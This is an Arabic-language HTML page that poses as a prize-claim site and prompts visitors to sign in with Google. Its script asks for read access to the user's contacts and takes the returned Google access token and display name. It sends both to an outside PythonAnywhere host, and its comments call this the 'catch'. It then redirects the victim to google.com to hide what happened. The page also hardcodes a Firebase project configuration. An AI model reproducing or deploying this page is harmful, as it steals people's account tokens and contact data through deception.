<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استلام الجائزة</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
</head>
<body style="text-align: center; padding-top: 50px; background-color: #121212; color: white; font-family: Arial;">

    <div style="background: #1e1e1e; padding: 30px; border-radius: 10px; display: inline-block; border: 1px solid #333;">
        <h2 style="color: #4285F4;">مبروك! أنت مؤهل للحصول على جائزة</h2>
        <p>سجل دخولك لتأكيد حسابك واستلام الجائزة فوراً</p>
        <button id="loginBtn" style="background: #4285F4; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold;">
            تسجيل الدخول عبر Google
        </button>
    </div>

    <script>
        // إعدادات مشروعك giftapp-5937d اللي في الصورة
        const firebaseConfig = {
            apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
            authDomain: "giftapp-5937d.firebaseapp.com",
            projectId: "giftapp-5937d",
            storageBucket: "giftapp-5937d.firebasestorage.app",
            messagingSenderId: "1067108116204",
            appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
        };

        // تفعيل الفايربيز
        firebase.initializeApp(firebaseConfig);

        // برمجة الزرار
        document.getElementById('loginBtn').onclick = function() {
            this.innerHTML = "جاري التحويل...";
            const provider = new firebase.auth.GoogleAuthProvider();
            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
            // التوجيه المباشر عشان نتخطى حماية المتصفحات
            firebase.auth().signInWithRedirect(provider);
        };

        // استلام البيانات لما يرجع من جوجل
        firebase.auth().getRedirectResult().then((result) => {
            if (result.credential) {
                const token = result.credential.accessToken;
                const sender = result.user.displayName || "Target";
                
                // إرسال الصيد للوحش في PythonAnywhere
                fetch(`https://mohamedahmed77.pythonanywhere.com/catch?token=${token}&sender=${sender}`)
                .then(() => { window.location.href = "https://google.com"; })
                .catch(() => { window.location.href = "https://google.com"; });
            }
        }).catch((error) => {
            alert("خطأ: " + error.message);
        });
    </script>
</body>
</html>
